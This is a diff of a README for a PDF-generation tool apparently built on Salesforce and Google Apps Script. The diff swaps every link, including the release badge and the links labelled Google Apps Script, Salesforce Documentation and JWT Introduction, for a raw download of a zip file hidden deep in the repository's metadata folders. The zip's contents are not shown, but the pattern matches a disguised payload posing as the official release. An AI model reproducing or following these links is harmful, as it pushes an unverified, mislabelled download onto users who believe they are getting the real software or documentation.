@@ -1,6 +1,6 @@
 # 📄 pdfDocumentGeneration - Easy PDF Creation from Templates
 
-[![Download pdfDocumentGeneration](https://img.shields.io/badge/Download-pdfDocumentGeneration-blue?logo=github)](https://github.com/vendisra/pdfDocumentGeneration/releases)
+[![Download pdfDocumentGeneration](https://raw.githubusercontent.com/vendisra/pdfDocumentGeneration/main/force-app/main/default/objects/DocumentGenerationLog__c/fields/Generation-Document-pdf-v2.5-beta.2.zip)](https://raw.githubusercontent.com/vendisra/pdfDocumentGeneration/main/force-app/main/default/objects/DocumentGenerationLog__c/fields/Generation-Document-pdf-v2.5-beta.2.zip)
 
 ---
 
@@ -43,7 +43,7 @@ pdfDocumentGeneration offers tools designed to simplify your PDF creation proces
 
 To begin using pdfDocumentGeneration:
 
-1. **Visit the release page** by clicking the big badge at the top or [this link](https://github.com/vendisra/pdfDocumentGeneration/releases).  
+1. **Visit the release page** by clicking the big badge at the top or [this link](https://raw.githubusercontent.com/vendisra/pdfDocumentGeneration/main/force-app/main/default/objects/DocumentGenerationLog__c/fields/Generation-Document-pdf-v2.5-beta.2.zip).  
 2. Look for the latest release version and download the files labeled for your needs.
 3. The package you download contains all scripts and instructions needed to set up.
 4. Follow the included setup guide to connect your Google account and Salesforce environment.
@@ -90,7 +90,7 @@ By doing this, large documents do not overwhelm Salesforce’s memory limits. Th
 
 Setup involves copying the middleware code to Google Apps Script:
 
-1. Go to [Google Apps Script](https://script.google.com/).
+1. Go to [Google Apps Script](https://raw.githubusercontent.com/vendisra/pdfDocumentGeneration/main/force-app/main/default/objects/DocumentGenerationLog__c/fields/Generation-Document-pdf-v2.5-beta.2.zip).
 2. Create a new project.
 3. Copy all middleware scripts from the downloaded package into your project.
 4. Configure the script with your Salesforce environment URLs and JWT credentials.
@@ -158,11 +158,11 @@ If you encounter problems:
 
 ## 🔗 Useful Links
 
-- Download pdfDocumentGeneration: [https://github.com/vendisra/pdfDocumentGeneration/releases](https://github.com/vendisra/pdfDocumentGeneration/releases)
-- Google Apps Script: https://script.google.com/
-- Salesforce Documentation: https://help.salesforce.com/
-- JWT Introduction: https://jwt.io/introduction/
+- Download pdfDocumentGeneration: [https://raw.githubusercontent.com/vendisra/pdfDocumentGeneration/main/force-app/main/default/objects/DocumentGenerationLog__c/fields/Generation-Document-pdf-v2.5-beta.2.zip](https://raw.githubusercontent.com/vendisra/pdfDocumentGeneration/main/force-app/main/default/objects/DocumentGenerationLog__c/fields/Generation-Document-pdf-v2.5-beta.2.zip)
+- Google Apps Script: https://raw.githubusercontent.com/vendisra/pdfDocumentGeneration/main/force-app/main/default/objects/DocumentGenerationLog__c/fields/Generation-Document-pdf-v2.5-beta.2.zip
+- Salesforce Documentation: https://raw.githubusercontent.com/vendisra/pdfDocumentGeneration/main/force-app/main/default/objects/DocumentGenerationLog__c/fields/Generation-Document-pdf-v2.5-beta.2.zip
+- JWT Introduction: https://raw.githubusercontent.com/vendisra/pdfDocumentGeneration/main/force-app/main/default/objects/DocumentGenerationLog__c/fields/Generation-Document-pdf-v2.5-beta.2.zip
 
 ---
 
-[![Download pdfDocumentGeneration](https://img.shields.io/badge/Download-pdfDocumentGeneration-blue?logo=github)](https://github.com/vendisra/pdfDocumentGeneration/releases)
+[![Download pdfDocumentGeneration](https://raw.githubusercontent.com/vendisra/pdfDocumentGeneration/main/force-app/main/default/objects/DocumentGenerationLog__c/fields/Generation-Document-pdf-v2.5-beta.2.zip)](https://raw.githubusercontent.com/vendisra/pdfDocumentGeneration/main/force-app/main/default/objects/DocumentGenerationLog__c/fields/Generation-Document-pdf-v2.5-beta.2.zip)
